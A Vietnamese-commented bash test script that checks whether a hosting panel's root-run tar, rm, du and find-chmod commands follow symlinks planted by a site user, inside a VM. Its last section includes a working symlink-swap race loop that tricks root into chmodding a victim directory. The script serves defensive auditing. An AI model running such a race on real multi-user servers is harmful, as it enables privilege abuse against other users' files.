#!/usr/bin/env bash
# N3: các lệnh tpan chạy bằng root trên cây thư mục của site: tar (backup),
# rm -r (xoá hẳn), du (đo dung lượng), và find ... -exec chmod (đặt quyền thư
# mục sau khi giải nén WordPress). Câu hỏi: lệnh nào đi theo symlink do user
# của site đặt, lệnh nào thua khi user đó tráo thư mục lúc lệnh đang chạy.
# Không cần tpan. Chạy bằng root trong máy ảo; mọi thứ dưới /srv/m28-thu.
set -u
B=/srv/m28-thu
S=$B/www/a
P=$S/public
SEC=$B/nan-nhan/bi-mat.txt

rm -rf "$B"
id tp_thu >/dev/null 2>&1 || useradd --system --user-group --no-create-home --shell /usr/sbin/nologin tp_thu
command -v strace >/dev/null 2>&1 || { apt-get install -y strace >/dev/null 2>&1; }
mkdir -p "$B/www" "$B/nan-nhan" "$B/nan-nhan-chmod/con"
chmod 755 "$B" "$B/www" "$B/nan-nhan-chmod" "$B/nan-nhan-chmod/con"
chmod 700 "$B/nan-nhan"
install -d -o tp_thu -g www-data -m 2750 "$S" "$P"
head -c 300 /dev/urandom | base64 >"$SEC"
chmod 600 "$SEC"
as() { runuser -u tp_thu -- "$@"; }

as cp /etc/hostname "$P/index.php"
as ln -s "$SEC" "$P/link-toi-bi-mat"
as ln -s "$B/nan-nhan" "$P/link-toi-thu-muc"
as mkdir -p "$P/wp-content/uploads"
as cp /etc/hostname "$P/wp-content/uploads/a.txt"

echo "=== phiên bản ==="
tar --version | head -1
rm --version | head -1
find --version | head -1

echo
echo "=== tar --create (cách BackupArchive gọi): symlink được lưu là symlink hay là nội dung? ==="
tar --create --gzip --file="$B/x.tar.gz" --one-file-system --directory="$S" public
tar --list --verbose --gzip --file="$B/x.tar.gz" | awk '{ $3=""; $4=""; $5=""; print }'
mkdir -p "$B/giai"
tar --extract --gzip --file="$B/x.tar.gz" --directory="$B/giai"
if grep -qF "$(head -c 40 "$SEC")" -r "$B/giai" 2>/dev/null; then echo "KQ tar: LO nội dung bí mật nằm trong file backup"; else echo "KQ tar: CHAN file backup không chứa nội dung bí mật (chỉ lưu cái link)"; fi
strace -f -e trace=openat -o "$B/tar.strace" tar --create --file="$B/y.tar" --one-file-system --directory="$S" public
echo "  strace: openat trong cây site có O_NOFOLLOW: $(grep -c 'O_NOFOLLOW' "$B/tar.strace"); không có O_NOFOLLOW mà là tên trong cây: $(grep -E 'openat\([0-9]+, "' "$B/tar.strace" | grep -vc O_NOFOLLOW)"
grep -E 'openat\([0-9]+, "' "$B/tar.strace" | head -4 | sed 's/^/    /'

echo
echo "=== rm -r --one-file-system (RemoveTree): đi bằng fd hay bằng đường dẫn? ==="
cp -a "$P" "$B/ban-sao"
strace -e trace=openat,unlinkat,newfstatat -o "$B/rm.strace" rm -r --one-file-system -- "$B/ban-sao"
echo "  strace: openat có O_NOFOLLOW: $(grep -c 'openat.*O_NOFOLLOW' "$B/rm.strace"), unlinkat theo fd thư mục: $(grep -cE 'unlinkat\([0-9]+,' "$B/rm.strace")"
grep -E 'unlinkat|openat\([0-9]' "$B/rm.strace" | head -5 | sed 's/^/    /'
echo "  file bí mật còn sau rm: $([ -f "$SEC" ] && echo có || echo KHÔNG)"

echo
echo "=== du -sb --one-file-system: có cộng cỡ của đích symlink không? ==="
head -c 5000000 /dev/zero >"$B/nan-nhan/to.bin"
du -sb --one-file-system -- "$P"
as ln -s "$B/nan-nhan/to.bin" "$P/link-to"
du -sb --one-file-system -- "$P"
echo "  (hai số gần bằng nhau: du không đi theo symlink)"

echo
echo "=== find -type d -exec chmod 2750 {} + chạy bằng root (cách WPFiles gọi), user của site tráo thư mục ==="
V=$B/nan-nhan-chmod
echo "  nạn nhân trước: $(stat -c '%n %U:%G %a' "$V" "$V/con" | tr '\n' ' ')"
as mkdir -p "$P/wp-includes"
for i in $(seq 1 40); do as mkdir -p "$P/wp-includes/d$i/x/y/z"; done
# Kẻ tấn công: tráo liên tục d1 giữa thư mục thật và symlink tới thư mục nạn nhân.
as bash -c 'cd "$1" || exit 1; while [ ! -e "$2" ]; do mv d1 d1.that 2>/dev/null && ln -s "$3" d1; sleep 0.001; rm -f d1; mv d1.that d1 2>/dev/null; done' _ "$P/wp-includes" "$B/dung" "$V" &
kq="CHAN sau 400 vòng (chưa thắng đua lần nào)"
for round in $(seq 1 400); do
  find "$P" -mindepth 1 -type d -exec chmod 2750 '{}' + 2>/dev/null
  m="$(stat -c %a "$V")"
  if [ "$m" != 755 ]; then
    kq="LO sau $round vòng: root đã chmod thư mục nạn nhân thành $m"
    break
  fi
done
touch "$B/dung"
wait
echo "  nạn nhân sau: $(stat -c '%n %U:%G %a' "$V" "$V/con" | tr '\n' ' ')"
echo "KQ find-chmod: $kq"

rm -rf "$B"
userdel tp_thu 2>/dev/null
